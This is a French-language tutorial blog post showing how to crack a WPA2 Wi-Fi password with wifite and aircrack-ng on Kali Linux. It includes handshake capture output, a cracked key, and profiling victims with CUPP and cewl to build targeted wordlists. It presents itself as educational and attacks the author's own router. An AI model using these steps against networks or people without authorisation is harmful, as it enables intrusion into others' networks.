---
title: Aircrack-NG Crack WIFI WPA2 Password
time: 2024-12-19 12:00:00
categories: [Hacking]
tags: [kali,wifi,hack,cybersecurity]
image: /assets/posts/WiFi/aircrack.jpg
---

## 🚨 Préambule Éthique

> **ATTENTION :** Ce guide est strictement à des fins éducatives et professionnelles.


## 🚀 Aircrack-NG 


-------------------

## 🎯 Préréquis
>  Un ordinateur portable

>  Hyperviseur (VMWare ou Virtualbox)

>  Adaptateur Wifi 

>  Votre propre point d'acès WIFI que vous avez le droit de pirater 

-------------------


## 🛠️ Préparation de l'environnement


#### Le lien pour télécharger la machine virtuelle Kali linux.

> [Kali Virtual Machine](https://www.kali.org/get-kali/#kali-virtual-machines)


## 🐧 Linux 
```bash
sudo apt update && sudo apt install wifite
```

## 🎮 Utilitaires réquis

>hashcat, bully, hcxdumptool, hcxpcapngtool, macchanger, wordlists

Vous pouvez installer ces préréquis avec les commandes suivantes:
   
```bash
sudo apt install hashcat bully hcxdumptool macchanger
sudo apt install hcxtools
sudo apt install wordlists
```
> Après l'installation des dictionnaires exécuter la commande wordlists qui vous proposera de décompresser rockyou,
>  mettez Y pour confirmer

```bash
$ wordlists 

> wordlists ~ Contains the rockyou wordlist

/usr/share/wordlists
├── amass -> /usr/share/amass/wordlists
├── dirb -> /usr/share/dirb/wordlists
├── dirbuster -> /usr/share/dirbuster/wordlists
├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
├── john.lst -> /usr/share/john/password.lst
├── legion -> /usr/share/legion/wordlists
├── metasploit -> /usr/share/metasploit-framework/data/wordlists
├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
├── rockyou.txt.gz
├── sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
├── wfuzz -> /usr/share/wfuzz/wordlist
└── wifite.txt -> /usr/share/dict/wordlist-probable.txt

Do you want to extract the wordlist rockyou.txt? [Y/n] 
```

## 🎮 UTILISATION PRATIQUE

### 🚀 Lancer wifite 

```bash
sudo wifite  
#vous pouvez spécifier un dictionnaire par exemple 
sudo wifite --dict /usr/share/wordlists/rockyou.txt
```

> A son lancement wifite passera la carte wifi du mode managed en mode écoute (monitor)

> Wifite passe notre carte Wi-Fi en mode monitor pour capturer le trafic réseau environnant. 
> En mode monitor :

  1. Notre carte écoute tout le trafic mais ne peut plus se connecter à Internet.
  2. On perds donc la connexion réseau.

```bash 

   .               .    
 .´  ·  .     .  ·  `.  wifite2 2.7.0
 :  :  :  (¯)  :  :  :  a wireless auditor by derv82
 `.  ·  ` /¯\ ´  ·  .´  maintained by kimocoder
   `     /¯¯¯\     ´    https://github.com/kimocoder/wifite2

 

    Interface   PHY   Driver              Chipset                               
-----------------------------------------------------------------------
 1. wlan0       phy0  iwlwifi             Intel Corporation Wireless 7260 (rev 6b)

 [+] Enabling monitor mode on wlan0... enabled!


 ``` 
### 🚀 Voir les réseaux wifis environnants

>Wifite nous affiche les réseaux wifis disponibles autour de nous en fonction des caractéristiques de notre carte réseau Wi-Fi, de l’antenne utilisée, et des conditions environnementales.

```bash

   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT              
   ---  -------------------------  ---  -----   ----   ---  ------
     1               korpstation    11  WPA-P   55db    no                                                                                                                                           
     2                  itel A04     1  WPA-P   18db    no                                                                                                                                           
     3           EBENE WIFI ZONE     1  OPN   14db   yes                                                                                                                                             
     4          HUAWEI-2.4G-sF93     4  WPA-P   14db   yes                                                                                                                                           
     5       (8E:E9:21:C2:A1:E2)     7  WPA-P   12db    no                                                                                                                                           
     6            Wifi_MOEVI_Vis     7  WPA-P   11db    no                                                                                                                                           
     7             Wifi_MOEVI_UP     7  WPA-P   10db   yes                                                                                                                                           
     8               ECC_GRACE_D*   11  WPA-P    9db    no    4                                                                                                                                   
```
> Je fais ensuite "Ctrl+C" pour arrêter l'énumération et je choisis le wifi que je veux pirater par son numéro. Ici je choici le numéro 1 qui correspond à mon routeur "korpstation" et on valide.

```bash 
 [+] Select target(s) (1-8) separated by commas, dashes or all: 1
```
 

### 📊 Attaque 
 > On laisse juste wifite s'occuper du reste.

```bash
 [+] (1/1) Starting attacks against 4C:11:54:AA:4F:54 (korpstation)
 [+] korpstation (44db) PMKID CAPTURE: Failed to capture PMKID   
 
 [+] korpstation (49db) WPA Handshake capture: Discovered new client: A6:55:4E:27:25:BD                                                                                                              
 [+] korpstation (48db) WPA Handshake capture: Captured handshake                                                                                                                                    
 [+] saving copy of handshake to hs/handshake_korpstation_4C-11-54-AA-4F-54_2024-12-18T13-42-58.cap saved

 [+] analysis of captured handshake file:
 [+]   tshark: .cap file contains a valid handshake for (4c:11:54:aa:4f:54)
 [+] aircrack: .cap file contains a valid handshake for (4C:11:54:AA:4F:54)

 [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
 [+] Cracking WPA Handshake: 0.50% ETA: 48s @ 4222.1kps (current key: 321654987)                                                                                                                     
 [+] Cracked WPA Handshake PSK: 321654987

 [+]   Access Point Name: korpstation
 [+]  Access Point BSSID: 4C:11:54:AA:4F:54
 [+]          Encryption: WPA
 [+]      Handshake File: hs/handshake_korpstation_4C-11-54-AA-4F-54_2024-12-18T13-42-58.cap
 [+]      PSK (password): 321654987
 [+] saved crack result to cracked.json (1 total)
 [+] Finished attacking 1 target(s), exiting

```
> Après quelques instants il a réussi à trouver le mot de passe. Le résultat de l'attaque est enregistré dans un fichier cracked.json dans le repertoie courant.

```yaml
┌──(korpstation㉿mrhove)-[~]
└─$ cat cracked.json                   
[
  {
    "type": "WPA",
    "date": 1734525779,
    "essid": "korpstation",
    "bssid": "4C:11:54:AA:4F:54",
    "key": "321654987",
    "handshake_file": "hs/handshake_korpstation_4C-11-54-AA-4F-54_2024-12-18T13-42-58.cap"
  }
]
```

# 📚 PERSONNALISATION DU DICTIONNAIRE D'ATTAQUE

## 🎯 Importance du Dictionnaire Personnalisé
> "Un dictionnaire personnalisé augmente considérablement les chances de succès."

L'efficacité de votre attaque dépend fortement de la pertinence de votre wordlist. Un dictionnaire personnalisé basé sur les informations de la cible est souvent plus efficace qu'une wordlist générique.

## 🛠️ Outils de Génération de Wordlist

### 1. Crunch - Générateur de Combinaisons
```bash
# Création d'une wordlist avec des dates
crunch 8 8 0123456789 -t %%DDMMYY > dates.txt

# Combinaisons avec préfixe spécifique
crunch 10 10 -t Company%%% > company_numbers.txt
```

### 2. CUPP (Common User Passwords Profiler)
```bash
# Installation
git clone https://github.com/Mebus/cupp.git
cd cupp

# Utilisation interactive
python3 cupp.py -i

# Mode interactif vous demandera:
- Prénom
- Nom
- Date de naissance
- Nom des enfants
- Nom des animaux
- Entreprise
- Autres mots-clés
```

### 3. Cewl - Extraction depuis Sites Web
```bash
# Extraction des mots d'un site web
cewl www.entreprise-cible.com -m 6 -w wordlist.txt

# Avec profondeur spécifique
cewl -d 2 -m 6 www.entreprise-cible.com -w wordlist_profonde.txt
```


 **Qualité > Quantité**
   - Préférez un petit dictionnaire ciblé à une énorme wordlist générique



